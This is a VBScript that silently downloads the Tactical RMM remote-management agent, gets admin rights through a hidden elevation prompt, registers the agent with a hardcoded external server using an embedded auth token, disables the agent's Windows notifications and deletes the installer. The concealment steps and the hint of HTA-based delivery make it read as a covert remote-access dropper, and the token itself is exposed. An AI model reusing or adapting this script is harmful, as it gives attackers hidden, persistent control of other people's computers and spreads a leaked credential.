Option Explicit

' ================= CONFIG =================
Const SERVER_URL   = "https://api.gustavodev.xyz"
Const AUTH_TOKEN   = "6b6827fdb520f8b1973a4fd121ddf52d64901aa73a0401be3b1e8de920c3affb"
Const CLIENT_ID    = "10"
Const SITE_ID      = "12"
Const AGENT_TYPE   = "server"
Const DOWNLOAD_URL = "https://github.com/amidaware/rmmagent/releases/download/v2.11.0/tacticalagent-v2.11.0-windows-amd64.exe"
' ==========================================

Dim shell, fso, LOG_PATH
Dim SAVE_PATH, AGENT_PATH, AGENT_PATH_ALT

Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

LOG_PATH       = shell.ExpandEnvironmentStrings("%TEMP%") & "\tactical-log.txt"
SAVE_PATH      = "C:\Windows\Temp\tacticalagent-installer.exe"
AGENT_PATH     = "C:\Program Files\TacticalAgent\tacticalrmm.exe"
AGENT_PATH_ALT = "C:\Program Files (x86)\TacticalAgent\tacticalrmm.exe"

On Error Resume Next
Main
If Err.Number <> 0 Then
    Log "FATAL: " & Err.Description & " (0x" & Hex(Err.Number) & ")"
End If
WScript.Quit

Sub Log(msg)
    On Error Resume Next
    Dim f
    Set f = fso.OpenTextFile(LOG_PATH, 8, True)
    f.WriteLine Now & " - " & msg
    f.Close
End Sub

Function RunSilent(cmd)
    On Error Resume Next
    RunSilent = shell.Run(cmd, 0, True)
    If Err.Number <> 0 Then
        Log "Run failed (" & Err.Number & "): " & cmd
        RunSilent = -1
    End If
End Function

Function IsAdmin()
    IsAdmin = (RunSilent("net session") = 0)
End Function

Sub Main()
    Log "=== started (admin=" & IsAdmin() & ") ==="

    ' ---- Elevation: relaunch hidden, only if not already admin ----
    If Not IsAdmin() Then
        Dim htaPath
        htaPath = WScript.ScriptFullName
        If htaPath = "" Then
            Log "ERROR: could not resolve own .vbs path"
            WScript.Quit
        End If
        Log "Relaunching elevated (hidden): " & htaPath
        On Error Resume Next
        Dim sa
        Set sa = CreateObject("Shell.Application")
        sa.ShellExecute "wscript.exe", """" & htaPath & """", "", "runas", 0
        If Err.Number <> 0 Then
            Log "Elevation declined/failed: " & Err.Description
            WScript.Quit
        End If
        WScript.Sleep 2000
        WScript.Quit
    End If

    ' ---- Elevated: all silent from here ----
    If fso.FileExists(AGENT_PATH) Or fso.FileExists(AGENT_PATH_ALT) Then
        Log "Agent already present - starting service."
        RunSilent "net start tacticalagent"
        Log "=== complete (already installed) ==="
        WScript.Sleep 1000
        WScript.Quit
    End If

    Log "Downloading agent from GitHub..."
    On Error Resume Next

    If Not fso.FolderExists("C:\Windows\Temp") Then fso.CreateFolder("C:\Windows\Temp")
    If fso.FileExists(SAVE_PATH) Then fso.DeleteFile SAVE_PATH, True

    Dim http
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.setTimeouts 30000, 30000, 30000, 300000
    http.open "GET", DOWNLOAD_URL, False
    http.send

    If http.status <> 200 Then
        Log "ERROR: download HTTP " & http.status
        WScript.Quit
    End If

    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile SAVE_PATH, 2
    stream.Close

    Log "Download complete (" & Round(fso.GetFile(SAVE_PATH).Size / 1024) & " KB)."

    Log "Installing silently..."
    Dim ins
    ins = RunSilent("""" & SAVE_PATH & """ /VERYSILENT /SUPPRESSMSGBOXES /NORESTART")
    Log "Inno exit code: " & ins

    Dim actualAgentPath
    actualAgentPath = ""
    If fso.FileExists(AGENT_PATH) Then
        actualAgentPath = AGENT_PATH
    ElseIf fso.FileExists(AGENT_PATH_ALT) Then
        actualAgentPath = AGENT_PATH_ALT
    Else
        Log "ERROR: tacticalrmm.exe not found after install (exit " & ins & ")"
        WScript.Quit
    End If

    Log "Registering agent with " & SERVER_URL & " ..."
    Dim regCmd, reg
    regCmd = """" & actualAgentPath & """ -m install -silent --api " & SERVER_URL & _
             " --client-id " & CLIENT_ID & _
             " --site-id " & SITE_ID & _
             " --agent-type " & AGENT_TYPE & _
             " --auth " & AUTH_TOKEN

    reg = RunSilent(regCmd)
    If reg = 0 Then
        Log "SUCCESS: registered!"
    Else
        Log "ERROR: registration exit code " & reg
    End If

    RunSilent "reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\TacticalRMM.TacticalAgent_a5q8hk8m23z2e\!App"" /v Enabled /t REG_DWORD /d 0 /f"
    RunSilent "net start tacticalagent"

    On Error Resume Next
    If fso.FileExists(SAVE_PATH) Then fso.DeleteFile SAVE_PATH, True

    Log "=== complete ==="
    WScript.Sleep 1000
End Sub